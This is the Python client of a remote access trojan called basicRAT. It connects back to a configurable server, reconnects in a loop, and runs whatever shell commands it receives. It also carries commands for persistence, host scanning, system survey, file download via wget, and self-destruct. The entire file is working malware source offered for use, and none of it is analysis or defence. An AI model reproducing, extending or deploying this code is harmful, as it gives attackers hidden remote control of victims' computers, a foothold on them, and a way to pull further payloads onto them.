#!/usr/bin/env python

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import sys
import time

from core import persistence, scan, survey, toolkit


# change these to suit your needs
HOST = 'localhost'
PORT = 1337

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 30

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    PLAT = 'unk'


def client_loop(conn):
    while True:
        results = ''
        
        # wait to receive data from server
        data = conn.recv(4096)
    
        # seperate data into command and action
        cmd, _, action = data.partition(' ')
    
        if cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read() + \
                      '\n"{}" completed.'.format(action)
        
        elif cmd == 'kill':
            conn.close()
            sys.exit(0)
    
        elif cmd == 'goodbye':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break
    
        elif cmd == 'persistence':
            results = persistence.run(PLAT)
    
        elif cmd == 'scan':
            results = scan.single_host(action)
    
        elif cmd == 'survey':
            results = survey.run(PLAT)
    
        elif cmd == 'unzip':
            results = toolkit.unzip(action)
    
        elif cmd == 'wget':
            results = toolkit.wget(action)
    
        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)
    
        conn.send(results)


def main():
    # connect to basicRAT server
    while True:
        conn = socket.socket()
        try:
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue
        # conn.setblocking(0)
    
        client_loop(conn)


if __name__ == '__main__':
    main()
